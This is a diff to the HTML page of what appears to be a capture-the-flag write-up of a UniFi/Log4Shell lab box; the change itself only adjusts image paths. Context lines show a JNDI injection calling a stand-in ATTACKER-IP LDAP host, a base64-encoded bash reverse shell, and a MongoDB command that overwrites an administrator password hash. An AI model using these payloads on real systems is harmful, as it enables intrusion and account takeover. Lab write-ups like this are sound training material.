@@ -210,7 +210,7 @@ https://nmap.org/submit/</p>
 
 <p>We begin web enumeration. The service on port 8080 (Tomcat) redirects to port 8443, where we find the UniFi Network login page.</p>
 
-<p><img src="/assets/writeups/unified/image.png" alt="image.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image.png" /></p>
 
 <hr />
 
@@ -229,7 +229,7 @@ https://nmap.org/submit/</p>
   <li><strong>UniFi Network Version 6.4.54</strong></li>
 </ul>
 
-<p><img src="/assets/writeups/unified/image1.png" alt="image.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image1.png" /></p>
 
 <hr />
 
@@ -290,7 +290,7 @@ https://nmap.org/submit/</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/api/login
 </code></pre></div></div>
 
-<p><img src="/assets/writeups/unified/image-2.png" alt="teste.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image-2.png" /></p>
 
 <p>The request body was JSON and contained a parameter named <code class="language-plaintext highlighter-rouge">remember</code>.</p>
 
@@ -347,7 +347,7 @@ https://nmap.org/submit/</p>
 
 <p>Even without RCE, an LDAP callback confirms the injection point.</p>
 
-<p><img src="/assets/writeups/unified/write_up_unified(response_burp).png" alt="write up unified(response burp).png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/write_up_unified(response_burp).png" /></p>
 
 <hr />
 
@@ -358,7 +358,7 @@ https://nmap.org/submit/</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>tcpdump <span class="nt">-i</span> tun0 port 389
 </code></pre></div></div>
 
-<p><img src="/assets/writeups/unified/image-3.png" alt="image.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image-3.png" /></p>
 
 <p>This confirms:</p>
 
@@ -382,7 +382,7 @@ mvn package
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>target/RogueJndi-1.1.jar
 </code></pre></div></div>
 
-<p><img src="/assets/writeups/unified/image-4.png" alt="image.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image-4.png" /></p>
 
 <p>This acts as a malicious LDAP server.</p>
 
@@ -405,7 +405,7 @@ mvn package
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-c</span> <span class="o">{</span><span class="nb">echo</span>,BASE64<span class="o">}</span>|<span class="o">{</span><span class="nb">base64</span>,-d<span class="o">}</span>|<span class="o">{</span>bash,-i<span class="o">}</span>
 </code></pre></div></div>
 
-<p><img src="/assets/writeups/unified/image-5.png" alt="image.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image-5.png" /></p>
 
 <hr />
 
@@ -428,7 +428,7 @@ mvn package
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${jndi:ldap://ATTACKER-IP:1389/o=tomcat}
 </code></pre></div></div>
 
-<p><img src="/assets/writeups/unified/image-7.png" alt="image.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image-7.png" /></p>
 
 <p>Reverse shell received.</p>
 
@@ -444,7 +444,7 @@ mvn package
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/michael
 </code></pre></div></div>
 
-<p><img src="/assets/writeups/unified/image-8.png" alt="image.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image-8.png" /></p>
 
 <hr />
 
@@ -460,7 +460,7 @@ mvn package
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>27117
 </code></pre></div></div>
 
-<p><img src="/assets/writeups/unified/image-9.png" alt="image.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image-9.png" /></p>
 
 <hr />
 
@@ -472,7 +472,7 @@ mvn package
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use ace
 </code></pre></div></div>
 
-<p><img src="/assets/writeups/unified/image-10.png" alt="image.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image-10.png" /></p>
 
 <hr />
 
@@ -484,7 +484,7 @@ mvn package
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>more admin_dump.txt
 </code></pre></div></div>
 
-<p><img src="/assets/writeups/unified/image-11.png" alt="image.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image-11.png" /></p>
 
 <hr />
 
@@ -520,8 +520,8 @@ mvn package
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mongo <span class="nt">--port</span> 27117 ace <span class="nt">--quiet</span> <span class="nt">--eval</span> <span class="s1">'db.admin.update({name:"administrator"},{$set:{x_shadow:"NEW_HASH"}})'</span>
 </code></pre></div></div>
 
-<p><img src="/assets/writeups/unified/image-12.png" alt="image.png" />
-<img src="/assets/writeups/unified/image-13.png" alt="image.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image-12.png" />
+<img src="/portfolio/assets/writeups/unified/image-13.png" /></p>
 
 <hr />
 
@@ -529,12 +529,12 @@ mvn package
 
 <p>Login successful:</p>
 
-<p><img src="/assets/writeups/unified/image-14.png" alt="image.png" />
-<img src="/assets/writeups/unified/image-15.png" alt="image.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image-14.png" />
+<img src="/portfolio/assets/writeups/unified/image-15.png" /></p>
 
 <p>Root credentials found in settings:</p>
 
-<p><img src="/assets/writeups/unified/image-16.png" alt="image.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image-16.png" /></p>
 
 <hr />
 
@@ -543,7 +543,7 @@ mvn package
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh root@10.129.1.13
 </code></pre></div></div>
 
-<p><img src="/assets/writeups/unified/image-17.png" alt="image.png" /></p>
+<p><img src="/portfolio/assets/writeups/unified/image-17.png" /></p>
 
 <hr />
 
